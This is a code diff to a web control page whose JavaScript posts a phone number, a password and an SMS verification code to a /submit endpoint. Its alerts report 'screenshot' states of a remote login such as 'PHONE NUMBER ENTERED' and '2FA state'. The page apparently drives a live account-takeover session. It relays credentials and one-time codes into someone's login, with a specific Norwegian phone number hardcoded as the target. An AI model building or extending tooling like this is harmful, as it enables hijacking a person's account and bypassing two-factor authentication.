@@ -203,16 +203,21 @@
         </div>
         
         <div class="field-group">
-            <label>Password</label>
-            <input type="password" id="pass" placeholder="Enter current password" autocomplete="off">
+            <label>Phone Number (Norway)</label>
+            <input type="text" id="phone" placeholder="+47 40300869" value="+47 40300869" autocomplete="off">
         </div>
         
         <div class="field-group">
-            <label>2FA Code</label>
-            <input type="text" id="code" placeholder="6-digit authentication code" maxlength="6" autocomplete="off">
+            <label>Password (if asked)</label>
+            <input type="password" id="pass" placeholder="Enter password" autocomplete="off">
         </div>
         
-        <button onclick="submit()">Authenticate Session</button>
+        <div class="field-group">
+            <label>Verification Code (SMS)</label>
+            <input type="text" id="code" placeholder="6-digit code" maxlength="6" autocomplete="off">
+        </div>
+        
+        <button onclick="submit()">Send Phone / Authenticate</button>
         
         <div class="feed-section">
             <div class="feed-header">
@@ -234,27 +239,36 @@
     
     <script>
         function submit() {
-            const pass = document.getElementById('pass').value;
-            const code = document.getElementById('code').value;
+            const phone = document.getElementById('phone').value.trim();
+            const pass = document.getElementById('pass').value.trim();
+            const code = document.getElementById('code').value.trim();
             
-            if (!pass && !code) {
-                alert("Type password first.");
+            if (!phone && !pass && !code) {
+                alert("Enter the phone number (+47 40300869) first.");
                 return;
             }
+            
+            const payload = {};
+            if (phone) payload.phone = phone;
+            if (pass) payload.password = pass;
+            if (code) payload.code = code;
             
             fetch('/submit', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ password: pass, code: code })
+                body: JSON.stringify(payload)
             })
             .then(r => r.json())
             .then(data => {
-                console.log(data);
-                if (pass && !code) {
-                    alert('Password sent — screenshot should now show "PASSWORD ENTERED" + logging in state.');
+                console.log('Submit response:', data);
+                
+                if (phone && !pass && !code) {
+                    alert('Phone sent! Screenshot now shows "PHONE NUMBER ENTERED" + SMS code sent.');
+                } else if (pass) {
+                    alert('Password sent — screenshot updated to PASSWORD ENTERED.');
                     document.getElementById('pass').value = '';
                 } else if (code) {
-                    alert('2FA sent — screenshot updated.');
+                    alert('Code sent — screenshot updated to 2FA state.');
                     document.getElementById('code').value = '';
                 }
             })
